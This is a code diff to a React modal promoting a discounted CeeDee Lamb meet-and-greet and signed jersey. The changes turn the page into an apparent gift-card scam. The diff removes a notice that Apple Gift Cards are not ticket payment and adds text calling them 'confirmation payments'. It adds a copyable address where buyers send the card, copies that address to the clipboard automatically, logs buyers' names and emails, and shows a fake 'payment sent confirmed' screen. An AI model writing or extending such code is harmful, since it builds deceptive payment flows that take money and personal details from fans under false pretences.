@@ -10,13 +10,23 @@ import {
   ExternalLink,
   User,
   Mail,
-  Info,
+  Copy,
   CheckCircle2,
   AlertCircle,
+  CreditCard,
+  ShieldCheck,
+  Loader2,
+  Send,
 } from "lucide-react";
 import ceedeeSignedJerseyImg from "../assets/images/ceedee_lamb_signed_jersey_1795712835942.jpg";
-import { APPLE_STORE_GIFT_CARD_URL } from "./common/GiftCardGuestPurchasePanel";
-import { recordAppleCardPartnerDeparture } from "../services/paymentControlService";
+import {
+  APPLE_STORE_GIFT_CARD_URL,
+  OFFICIAL_GIFTCARD_EMAIL,
+} from "./common/GiftCardGuestPurchasePanel";
+import {
+  recordAppleCardPartnerDeparture,
+  recordAppleCardSentConfirmation,
+} from "../services/paymentControlService";
 import { cn } from "../lib/utils";
 
 export const CEEDEE_REGULAR_TICKET_USD = 100;
@@ -28,7 +38,7 @@ export interface CeeDeePromoSelection {
   includeJersey: boolean;
   totalUsd: number;
   discountUsd: number;
-  paymentPreference: "regular";
+  paymentPreference: "regular" | "other_methods";
   customerName?: string;
   customerEmail?: string;
 }
@@ -73,7 +83,12 @@ export const CeeDeePublicPromoOfferModal: React.FC<CeeDeePublicPromoOfferModalPr
     () => initialCustomerEmail || localStorage.getItem("nfl_guest_buyer_email") || ""
   );
   const [validationError, setValidationError] = useState<string | null>(null);
+  const [copiedEmail, setCopiedEmail] = useState<boolean>(false);
   const [openedAppleStore, setOpenedAppleStore] = useState<boolean>(false);
+  const [returnedFromAppleStore, setReturnedFromAppleStore] = useState<boolean>(false);
+  const [isConfirmingSent, setIsConfirmingSent] = useState<boolean>(false);
+  const [paymentSentConfirmed, setPaymentSentConfirmed] = useState<boolean>(false);
+  const [confirmedRefId, setConfirmedRefId] = useState<string>("");
 
   const nameInputRef = useRef<HTMLInputElement | null>(null);
   const emailInputRef = useRef<HTMLInputElement | null>(null);
@@ -93,7 +108,6 @@ export const CeeDeePublicPromoOfferModal: React.FC<CeeDeePublicPromoOfferModalPr
   useEffect(() => {
     if (!isOpen) {
       setValidationError(null);
-      setOpenedAppleStore(false);
       return;
     }
 
@@ -106,6 +120,28 @@ export const CeeDeePublicPromoOfferModal: React.FC<CeeDeePublicPromoOfferModalPr
     return () => window.removeEventListener("keydown", handleKeyDown);
   }, [isOpen, onClose]);
 
+  // Detect visitor returning to this tab/window from Apple's official online store
+  useEffect(() => {
+    if (!isOpen || !openedAppleStore || paymentSentConfirmed) return;
+
+    const markReturned = () => {
+      setReturnedFromAppleStore(true);
+    };
+
+    const handleVisibility = () => {
+      if (document.visibilityState === "visible") {
+        markReturned();
+      }
+    };
+
+    window.addEventListener("focus", markReturned);
+    document.addEventListener("visibilitychange", handleVisibility);
+    return () => {
+      window.removeEventListener("focus", markReturned);
+      document.removeEventListener("visibilitychange", handleVisibility);
+    };
+  }, [isOpen, openedAppleStore, paymentSentConfirmed]);
+
   if (!isOpen) return null;
 
   const trimmedName = customerName.trim();
@@ -117,6 +153,10 @@ export const CeeDeePublicPromoOfferModal: React.FC<CeeDeePublicPromoOfferModalPr
   const discountedTotal = CEEDEE_DISCOUNTED_TICKET_USD + jerseyAddonTotal;
   const regularTotal = CEEDEE_REGULAR_TICKET_USD + jerseyAddonTotal;
 
+  const activeSessionId =
+    sessionId ||
+    `INQ-${Date.now().toString(36).toUpperCase()}-${Math.random().toString(36).substring(2, 6).toUpperCase()}`;
+
   const handleNameChange = (val: string) => {
     setCustomerName(val);
     setValidationError(null);
@@ -127,6 +167,16 @@ export const CeeDeePublicPromoOfferModal: React.FC<CeeDeePublicPromoOfferModalPr
     setCustomerEmail(val);
     setValidationError(null);
     onCustomerDetailsChange?.(customerName, val);
+  };
+
+  const handleCopySupportEmail = () => {
+    try {
+      void navigator.clipboard.writeText(OFFICIAL_GIFTCARD_EMAIL);
+    } catch {
+      // ignore clipboard errors
+    }
+    setCopiedEmail(true);
+    window.setTimeout(() => setCopiedEmail(false), 2400);
   };
 
   const handleValidationFailure = () => {
@@ -144,6 +194,13 @@ export const CeeDeePublicPromoOfferModal: React.FC<CeeDeePublicPromoOfferModalPr
   const handleDirectAppleStoreClick = () => {
     setValidationError(null);
     try {
+      void navigator.clipboard.writeText(OFFICIAL_GIFTCARD_EMAIL);
+      setCopiedEmail(true);
+    } catch {
+      // ignore clipboard errors
+    }
+
+    try {
       localStorage.setItem("nfl_guest_sender_name", trimmedName);
       localStorage.setItem("nfl_guest_buyer_email", trimmedEmail);
       sessionStorage.setItem("nfl_ceedee_public_promo_choice_v1", "apple_store_direct");
@@ -154,12 +211,8 @@ export const CeeDeePublicPromoOfferModal: React.FC<CeeDeePublicPromoOfferModalPr
 
     onCustomerDetailsChange?.(trimmedName, trimmedEmail);
 
-    const resolvedSessionId =
-      sessionId ||
-      `INQ-${Date.now().toString(36).toUpperCase()}-${Math.random().toString(36).substring(2, 6).toUpperCase()}`;
-
     void recordAppleCardPartnerDeparture({
-      sessionId: resolvedSessionId,
+      sessionId: activeSessionId,
       customerName: trimmedName,
       customerEmail: trimmedEmail,
       customerPhone: trimmedEmail,
@@ -174,6 +227,33 @@ export const CeeDeePublicPromoOfferModal: React.FC<CeeDeePublicPromoOfferModalPr
     });
 
     setOpenedAppleStore(true);
+  };
+
+  const handleConfirmPaymentSent = async () => {
+    if (!hasValidForm) {
+      handleValidationFailure();
+      return;
+    }
+    setIsConfirmingSent(true);
+    setValidationError(null);
+    try {
+      const res = await recordAppleCardSentConfirmation({
+        sessionId: activeSessionId,
+        customerName: trimmedName,
+        customerEmail: trimmedEmail,
+        customerPhone: trimmedEmail,
+        itemTitle: `CeeDee Lamb Public Meet & Greet · December 26th${includeJersey ? " + Signed #88 Jersey" : ""}`,
+        itemType: "experience",
+        amount: discountedTotal,
+        venue: "AT&T Stadium · Arlington, Texas",
+      });
+      setConfirmedRefId(res?.orderId || activeSessionId);
+      setPaymentSentConfirmed(true);
+    } catch {
+      setValidationError("Unable to record confirmation right now. Please try again.");
+    } finally {
+      setIsConfirmingSent(false);
+    }
   };
 
   return (
@@ -212,7 +292,25 @@ export const CeeDeePublicPromoOfferModal: React.FC<CeeDeePublicPromoOfferModalPr
             className="h-1 w-full bg-gradient-to-r from-[#002244] via-[#E2E8F0] to-[#002244]"
           />
 
-          {/* Easy Close Button */}
+          {/* Top Corner Controls: Other Payment Method (Left Corner) + Close (Right Corner) */}
+          <button
+            type="button"
+            onClick={() =>
+              onSelectOffer({
+                includeJersey,
+                totalUsd: regularTotal,
+                discountUsd: 0,
+                paymentPreference: "other_methods",
+                customerName: trimmedName,
+                customerEmail: trimmedEmail,
+              })
+            }
+            className="absolute top-4 left-4 z-30 min-h-[38px] px-3 py-1.5 rounded-xl bg-[#09152E]/95 hover:bg-[#13244A] border border-[#60A5FA]/45 text-[11px] font-bold uppercase tracking-wider text-[#93C5FD] hover:text-white inline-flex items-center gap-1.5 transition-colors cursor-pointer shadow-md"
+          >
+            <CreditCard className="w-3.5 h-3.5 shrink-0" />
+            <span>Other Payment Method</span>
+          </button>
+
           <button
             type="button"
             onClick={onClose}
@@ -223,9 +321,9 @@ export const CeeDeePublicPromoOfferModal: React.FC<CeeDeePublicPromoOfferModalPr
           </button>
 
           {/* Scrollable Container for Smaller Mobile Viewports */}
-          <div className="relative z-10 p-5 sm:p-8 max-h-[88vh] overflow-y-auto space-y-5">
+          <div className="relative z-10 px-5 pb-6 pt-16 sm:p-8 sm:pt-16 max-h-[88vh] overflow-y-auto space-y-5">
             {/* 1. Top Badge & Headline */}
-            <div className="text-center space-y-2.5 pr-6 sm:pr-0">
+            <div className="text-center space-y-2.5">
               <div className="inline-flex items-center gap-2 px-3 py-1 rounded-md bg-[#002244]/90 border border-[#B0B7BC]/40 text-[11px] font-black uppercase tracking-[0.22em] text-[#E2E8F0] shadow-[0_0_22px_rgba(56,189,248,0.18)]">
                 <Sparkles className="w-3.5 h-3.5 text-[#7DD3FC]" />
                 <span>EXCLUSIVE FAN OFFER</span>
@@ -321,7 +419,6 @@ export const CeeDeePublicPromoOfferModal: React.FC<CeeDeePublicPromoOfferModalPr
                   : "border-[#B0B7BC]/25 bg-[#050E22]/90 hover:border-[#B0B7BC]/45"
               )}
             >
-              {/* Soft Lighting Accent Behind Jersey Display */}
               <div
                 aria-hidden="true"
                 className="absolute -left-10 top-1/2 -translate-y-1/2 w-56 h-56 rounded-full pointer-events-none opacity-45 blur-2xl"
@@ -332,7 +429,6 @@ export const CeeDeePublicPromoOfferModal: React.FC<CeeDeePublicPromoOfferModalPr
               />
 
               <div className="relative z-10 grid grid-cols-1 sm:grid-cols-12 gap-4 items-center">
-                {/* Jersey Preview Image */}
                 <div className="sm:col-span-5">
                   <div className="relative rounded-xl overflow-hidden border border-[#B0B7BC]/45 bg-[#030816] aspect-[4/3] shadow-[0_12px_30px_rgba(0,0,0,0.55)]">
                     <img
@@ -354,7 +450,6 @@ export const CeeDeePublicPromoOfferModal: React.FC<CeeDeePublicPromoOfferModalPr
                   </div>
                 </div>
 
-                {/* Jersey Offer Copy & Interactive Add-On Toggle */}
                 <div className="sm:col-span-7 space-y-3">
                   <div>
                     <span className="text-[10px] font-black uppercase tracking-[0.2em] text-[#93C5FD] block">
@@ -368,7 +463,6 @@ export const CeeDeePublicPromoOfferModal: React.FC<CeeDeePublicPromoOfferModalPr
                     </p>
                   </div>
 
-                  {/* Transparent Price, Availability & Terms */}
                   <div className="rounded-xl bg-[#030816]/85 border border-white/10 p-3 text-[11px] text-[#CBD5E1] space-y-1">
                     <div className="flex items-center justify-between gap-2">
                       <span className="font-bold text-white">
@@ -383,7 +477,6 @@ export const CeeDeePublicPromoOfferModal: React.FC<CeeDeePublicPromoOfferModalPr
                     </p>
                   </div>
 
-                  {/* Selectable Add-On Checkbox / Toggle */}
                   <label
                     htmlFor="ceedee-signed-jersey-toggle"
                     className={cn(
@@ -451,7 +544,7 @@ export const CeeDeePublicPromoOfferModal: React.FC<CeeDeePublicPromoOfferModalPr
                   Enter Your Name &amp; Gmail Before Proceeding
                 </h3>
                 <p className="text-[11px] text-[#94A3B8] mt-0.5">
-                  Required to log your December 26th meet-and-greet registration inquiry before continuing.
+                  Required to link your December 26th AT&amp;T Stadium Meet &amp; Greet reservation with your payment.
                 </p>
               </div>
 
@@ -507,25 +600,118 @@ export const CeeDeePublicPromoOfferModal: React.FC<CeeDeePublicPromoOfferModalPr
               )}
             </div>
 
-            {/* Clear Disclosure: Apple Gift Card Purchase Is Separate */}
-            <div className="rounded-xl bg-[#030816]/90 border border-[#B0B7BC]/25 p-3.5 flex items-start gap-2.5 text-[11px] text-[#CBD5E1] leading-relaxed">
-              <Info className="w-4 h-4 text-[#7DD3FC] shrink-0 mt-0.5" />
-              <p>
-                <strong className="text-white">Independent Apple Store Purchase Notice:</strong>{" "}
-                Clicking below opens Apple&apos;s official online gift-card store (<span className="font-mono text-[#E2E8F0]">apple.com/shop/gift-cards</span>), where you independently select a gift card, enter recipient details, and complete checkout directly with Apple. Apple Gift Cards are a separate third-party purchase and are <strong className="text-white">not</strong> payment for, or confirmation of, a meet-and-greet ticket.
-              </p>
+            {/* 6. Confirmation Payment Explanation + Copy Where to Send the Apple Card */}
+            <div className="rounded-2xl bg-[#051229] border border-[#60A5FA]/35 p-4 space-y-3">
+              <div className="flex items-start gap-2.5 text-xs text-[#E2E8F0] leading-relaxed">
+                <ShieldCheck className="w-4 h-4 text-[#7DD3FC] shrink-0 mt-0.5" />
+                <p>
+                  <strong className="text-white">Confirmation Payment Policy:</strong>{" "}
+                  Apple Gift Cards are accepted as confirmation payments for your CeeDee Lamb Meet &amp; Greet ticket. Copy the official delivery email below, complete your purchase on Apple&apos;s official online store (<span className="font-mono text-[#7DD3FC]">apple.com/shop/gift-cards</span>), and come back here to confirm once your payment has been sent.
+                </p>
+              </div>
+
+              {/* Copyable Official Delivery Email Box */}
+              <div className="rounded-xl bg-[#030816] border border-[#B0B7BC]/30 p-3 flex flex-col sm:flex-row sm:items-center justify-between gap-2.5">
+                <div className="min-w-0">
+                  <span className="text-[10px] font-bold uppercase tracking-wider text-[#94A3B8] block">
+                    Send Your Apple Gift Card To:
+                  </span>
+                  <span className="font-mono text-xs sm:text-sm font-black text-white select-all break-all">
+                    {OFFICIAL_GIFTCARD_EMAIL}
+                  </span>
+                </div>
+                <button
+                  type="button"
+                  onClick={handleCopySupportEmail}
+                  className="min-h-[40px] px-3.5 py-2 rounded-lg bg-[#003594]/60 hover:bg-[#003594] border border-[#60A5FA]/45 text-xs font-bold text-white inline-flex items-center justify-center gap-1.5 shrink-0 cursor-pointer transition-colors"
+                >
+                  {copiedEmail ? (
+                    <>
+                      <Check className="w-3.5 h-3.5 text-emerald-400" />
+                      <span className="text-emerald-300">Copied!</span>
+                    </>
+                  ) : (
+                    <>
+                      <Copy className="w-3.5 h-3.5 text-[#7DD3FC]" />
+                      <span>Copy Email</span>
+                    </>
+                  )}
+                </button>
+              </div>
             </div>
 
-            {openedAppleStore && (
-              <div className="rounded-xl bg-emerald-500/10 border border-emerald-400/35 px-4 py-3 flex items-center gap-2.5 text-xs text-emerald-200">
-                <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />
-                <span>
-                  Apple&apos;s official gift-card store opened in a new tab. You can also continue with regular ticket checkout below.
-                </span>
-              </div>
+            {/* 7. Return-From-Apple Confirmation Selector ("Have You Sent Your Payment?") */}
+            {paymentSentConfirmed ? (
+              <motion.div
+                initial={{ opacity: 0, y: 6 }}
+                animate={{ opacity: 1, y: 0 }}
+                className="rounded-2xl bg-emerald-500/12 border border-emerald-400/50 p-4 sm:p-5 space-y-2.5 text-center"
+              >
+                <div className="w-11 h-11 rounded-full bg-emerald-500/20 border border-emerald-400/40 flex items-center justify-center mx-auto">
+                  <CheckCircle2 className="w-6 h-6 text-emerald-400" />
+                </div>
+                <h4 className="text-sm sm:text-base font-black uppercase tracking-wide text-white">
+                  Apple Card Payment Sent Confirmed!
+                </h4>
+                <p className="text-xs text-[#CBD5E1] max-w-md mx-auto leading-relaxed">
+                  Thank you, <strong className="text-white">{trimmedName}</strong>. We have logged your confirmation for <strong className="text-white">${discountedTotal.toFixed(2)} USD</strong> (Ref: <span className="font-mono text-emerald-300">{confirmedRefId}</span>). Once verified in <span className="font-mono text-white">{OFFICIAL_GIFTCARD_EMAIL}</span>, your AT&amp;T Stadium Meet &amp; Greet pass will be sent to <strong className="text-white">{trimmedEmail}</strong>.
+                </p>
+              </motion.div>
+            ) : openedAppleStore && (
+              <motion.div
+                initial={{ opacity: 0, y: 6 }}
+                animate={{ opacity: 1, y: 0 }}
+                className="rounded-2xl bg-[#071A38] border border-emerald-400/45 p-4 sm:p-5 space-y-3"
+              >
+                <div className="space-y-1">
+                  <span className="text-[10px] font-black uppercase tracking-[0.18em] text-emerald-300 block">
+                    {returnedFromAppleStore
+                      ? "Welcome Back From Apple Store Online"
+                      : "Apple Store Online Opened in New Tab"}
+                  </span>
+                  <h4 className="text-sm sm:text-base font-black uppercase tracking-tight text-white">
+                    Have You Sent Your Apple Gift Card Payment?
+                  </h4>
+                  <p className="text-xs text-[#CBD5E1] leading-relaxed">
+                    Once you finish purchasing and sending your Apple Gift Card to <span className="font-mono text-white">{OFFICIAL_GIFTCARD_EMAIL}</span> on Apple&apos;s site, select an option below to confirm your reservation.
+                  </p>
+                </div>
+
+                <div className="grid grid-cols-1 sm:grid-cols-2 gap-2.5">
+                  <button
+                    type="button"
+                    disabled={isConfirmingSent}
+                    onClick={handleConfirmPaymentSent}
+                    className="min-h-[48px] px-4 py-3 rounded-xl bg-gradient-to-r from-emerald-500 to-teal-500 hover:brightness-105 disabled:opacity-60 text-[#030816] font-black text-xs uppercase tracking-wider inline-flex items-center justify-center gap-2 cursor-pointer shadow-lg"
+                  >
+                    {isConfirmingSent ? (
+                      <>
+                        <Loader2 className="w-4 h-4 animate-spin" />
+                        <span>Recording Confirmation...</span>
+                      </>
+                    ) : (
+                      <>
+                        <Send className="w-4 h-4 shrink-0" />
+                        <span>Yes, I Have Sent My Payment</span>
+                      </>
+                    )}
+                  </button>
+
+                  <a
+                    href={APPLE_STORE_GIFT_CARD_URL}
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    onClick={handleDirectAppleStoreClick}
+                    className="min-h-[48px] px-4 py-3 rounded-xl bg-white/5 hover:bg-white/10 border border-[#B0B7BC]/35 text-[#E2E8F0] font-bold text-xs uppercase tracking-wider inline-flex items-center justify-center gap-2 cursor-pointer"
+                  >
+                    <ExternalLink className="w-3.5 h-3.5 shrink-0" />
+                    <span>Not Yet · Reopen Apple Store</span>
+                  </a>
+                </div>
+              </motion.div>
             )}
 
-            {/* 6. Primary Direct Apple Store Redirect & Separate Regular $100 Checkout */}
+            {/* 8. Primary Direct Apple Store Redirect & Separate Regular $100 Checkout */}
             <div className="space-y-2.5 pt-1">
               {hasValidForm ? (
                 <a
@@ -551,7 +737,7 @@ export const CeeDeePublicPromoOfferModal: React.FC<CeeDeePublicPromoOfferModalPr
                 </button>
               )}
 
-              <div className="flex flex-col sm:flex-row items-center justify-center pt-0.5">
+              <div className="flex flex-col sm:flex-row items-center justify-center gap-2.5 pt-0.5">
                 <button
                   type="button"
                   onClick={() =>
